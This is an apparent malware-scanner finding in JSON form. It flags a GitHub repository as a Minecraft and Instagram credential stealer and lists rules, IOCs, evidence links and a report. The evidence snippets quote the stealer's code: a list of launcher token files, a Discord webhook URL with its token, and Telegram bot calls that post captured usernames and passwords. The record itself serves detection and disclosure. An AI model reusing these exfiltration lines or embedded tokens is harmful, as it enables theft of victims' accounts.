@@ -1,0 +1,157 @@
+{
+  "finding": {
+    "key": "repository:fadi002/decompiled-stuff",
+    "kind": "repository",
+    "id": "fadi002/decompiled-stuff",
+    "url": "https://github.com/Fadi002/decompiled-stuff",
+    "registry": "github",
+    "owner": "fadi002",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 15,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "credential_access/mc-launcher-accounts; network_exfil/discord-webhook; code_execution/py-dyn; network_exfil/telegram-bot",
+    "evidence_locations": "loggers/Kraken.py:452; loggers/Kraken.py:58; loggers/Kraken.py:161; Others/6-tools-in-one-tool.py:51; Others/6-tools-in-one-tool.py:85; Others/6-tools-in-one-tool.py:107; Others/6-tools-in-one-tool.py:136; Others/6-tools-in-one-tool.py:178; Others/6-tools-in-one-tool.py:215; Others/6-tools-in-one-tool.py:257; Others/6-tools-in-one-tool.py:307; Instagram_tools/clean-account.py:16; Instagram_tools/DM-spamming.py:24",
+    "c2_hosts": "discord.com; api.telegram.org",
+    "iocs": "discord.com; api.telegram.org; https://discord.com/api/webhooks/1000835392733458614/68waXYeF80NhWi6U9gB2c4m3lY5jia48m4fC45yRLdV1FgdO3qXFgFfSenr7FcObA5wd; https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={j}\\n𝐮𝐬𝐞𝐫:; https://api.telegram.org/bot2077402917:AAHCK5zv-tSiUhxTwW8h4KiQiX3UJf9Pdhc/sendMessage?chat_id={1029120507}&text=𝐇𝐔𝐍𝐓𝐄𝐃; https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=𝐇𝐔𝐍𝐓𝐄𝐃; loggers/Kraken.py",
+    "matched_signatures": "\"launcher_accounts.json\" \"api/webhooks\"",
+    "reasons": "Shares a confirmed-malware code signature ['\"launcher_accounts.json\" \"api/webhooks\"'] | Tier-2 confirmed (bash score 14)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261003T093317Z",
+    "last_seen": "hunt-20261003T093317Z",
+    "evidence_file": "repositories/fadi002_decompiled-stuff.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "loggers/Kraken.py",
+      "line": 452,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": "OOO0OO00OOOO0OOO0 =['launcher_accounts.json','launcher_profiles.json','usercache.json','launcher_log.txt']#line:548"
+    },
+    {
+      "file": "loggers/Kraken.py",
+      "line": 58,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "webhook1 ='https://discord.com/api/webhooks/1000835392733458614/68waXYeF80NhWi6U9gB2c4m3lY5jia48m4fC45yRLdV1FgdO3qXFgFfSenr7FcObA5wd'#line:66"
+    },
+    {
+      "file": "loggers/Kraken.py",
+      "line": 58,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "webhook1 ='https://discord.com/api/webhooks/1000835392733458614/68waXYeF80NhWi6U9gB2c4m3lY5jia48m4fC45yRLdV1FgdO3qXFgFfSenr7FcObA5wd'#line:66"
+    },
+    {
+      "file": "loggers/Kraken.py",
+      "line": 161,
+      "category": "code_execution",
+      "rule": "py-dyn",
+      "snippet": "O0O000OO00O0O0OOO .chrome_reg =re .compile (r'(^profile\\s\\d*)|default|(guest profile$)',re .IGNORECASE |re .MULTILINE )#line:181"
+    },
+    {
+      "file": "loggers/Kraken.py",
+      "line": 452,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": "OOO0OO00OOOO0OOO0 =['launcher_accounts.json','launcher_profiles.json','usercache.json','launcher_log.txt']#line:548"
+    },
+    {
+      "file": "Others/6-tools-in-one-tool.py",
+      "line": 51,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "tele = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={j}\\n 𝐮𝐬𝐞𝐫: {user}\\n\\n{x2}')                re = requests.post(tele)"
+    },
+    {
+      "file": "Others/6-tools-in-one-tool.py",
+      "line": 85,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "tele = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={j}\\n 𝐮𝐬𝐞𝐫: {user}\\n\\n{x2}')"
+    },
+    {
+      "file": "Others/6-tools-in-one-tool.py",
+      "line": 107,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "tele = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={j}\\n 𝚄𝚂𝙴𝚁: {user}\\n\\n{x2}')"
+    },
+    {
+      "file": "Others/6-tools-in-one-tool.py",
+      "line": 136,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "tele = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={j}\\n 𝐮𝐬𝐞𝐫: {user}\\n\\n{x2}')"
+    },
+    {
+      "file": "Others/6-tools-in-one-tool.py",
+      "line": 178,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={j}\\n 𝐮𝐬𝐞𝐫: {user}\\n\\n{x2}')                    re = requests.post(tele)"
+    },
+    {
+      "file": "Others/6-tools-in-one-tool.py",
+      "line": 215,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "tele = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={j}\\n 𝐮𝐬𝐞𝐫: {user}\\n\\n{x2}')"
+    },
+    {
+      "file": "Others/6-tools-in-one-tool.py",
+      "line": 257,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "tele = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={j}\\n 𝐮𝐬𝐞𝐫: {user}\\n\\n{x2}')                re = requests.post(tele)"
+    },
+    {
+      "file": "Others/6-tools-in-one-tool.py",
+      "line": 307,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={j}\\n𝐮𝐬𝐞𝐫: {user}\\n\\n{x2}')"
+    },
+    {
+      "file": "Instagram_tools/clean-account.py",
+      "line": 16,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "url= f'https://api.telegram.org/bot2077402917:AAHCK5zv-tSiUhxTwW8h4KiQiX3UJf9Pdhc/sendMessage?chat_id={1029120507}&text=𝐇𝐔𝐍𝐓𝐄𝐃 𝐍𝐄𝐖 𝐀𝐂𝐂\\n----------------\\n𝐔𝐒𝐄𝐑 : {user}\\n𝐏𝐀𝐒𝐒 : {password}\\n------------"
+    },
+    {
+      "file": "Instagram_tools/DM-spamming.py",
+      "line": 24,
+      "category": "network_exfil",
+      "rule": "telegram-bot",
+      "snippet": "start_msg = requests.post(f\"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=𝐇𝐔𝐍𝐓𝐄𝐃 𝐍𝐄𝐖 𝐀𝐂𝐂\\n----------------\\n𝐔𝐒𝐄𝐑 : {user}\\n𝐏𝐀𝐒𝐒 : {password}\\n----------------\\n𝐁𝐘 : @ihmzz \").json()"
+    }
+  ],
+  "commit_sha": "de3f7219d0dc721456361b100d4271acd5479d3f",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/fadi002/decompiled-stuff",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file loggers/Kraken.py around line 452. The code reads the saved account store of a Minecraft launcher (the vanilla launcher, Lunar Client, Feather Client or the Essential mod). Those files hold refresh and access tokens for the victim's Microsoft account, so copying them lets the attacker sign in as the victim. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: \"launcher_accounts.json\" \"api/webhooks\".",
+    "payload_description": "The malicious payload sits in loggers/Kraken.py at line 452. The code reads the saved account store of a Minecraft launcher (the vanilla launcher, Lunar Client, Feather Client or the Essential mod). Those files hold refresh and access tokens for the victim's Microsoft account, so copying them lets the attacker sign in as the victim. Detection rules that fired in this repository: network_exfil/telegram-bot (3 files), code_execution/py-dyn (1 file), credential_access/mc-launcher-accounts (1 file), network_exfil/discord-webhook (1 file).",
+    "publisher": "fadi002",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "minecraft-account-stealer",
+      "credential-theft"
+    ],
+    "evidence_references": "https://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/loggers/Kraken.py#L452\nhttps://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/loggers/Kraken.py#L58\nhttps://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/loggers/Kraken.py#L161\nhttps://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/Others/6-tools-in-one-tool.py#L51\nhttps://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/Others/6-tools-in-one-tool.py#L85\nhttps://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/Others/6-tools-in-one-tool.py#L107\nhttps://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/Others/6-tools-in-one-tool.py#L136\nhttps://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/Others/6-tools-in-one-tool.py#L178\nhttps://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/Others/6-tools-in-one-tool.py#L215\nhttps://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/Others/6-tools-in-one-tool.py#L257\nhttps://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/Others/6-tools-in-one-tool.py#L307\nhttps://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/Instagram_tools/clean-account.py#L16\nhttps://github.com/fadi002/decompiled-stuff/blob/de3f7219d0dc721456361b100d4271acd5479d3f/Instagram_tools/DM-spamming.py#L24",
+    "verified_iocs": "discord.com\napi.telegram.org\nhttps://discord.com/api/webhooks/1000835392733458614/68waXYeF80NhWi6U9gB2c4m3lY5jia48m4fC45yRLdV1FgdO3qXFgFfSenr7FcObA5wd\nhttps://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={j}\\n𝐮𝐬𝐞𝐫:\nhttps://api.telegram.org/bot2077402917:AAHCK5zv-tSiUhxTwW8h4KiQiX3UJf9Pdhc/sendMessage?chat_id={1029120507}&text=𝐇𝐔𝐍𝐓𝐄𝐃\nhttps://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=𝐇𝐔𝐍𝐓𝐄𝐃\nloggers/Kraken.py",
+    "contributors": [],
+    "first_seen": "2026-10-03T09:33:17Z",
+    "last_seen": "2026-10-03T09:33:17Z"
+  }
+}
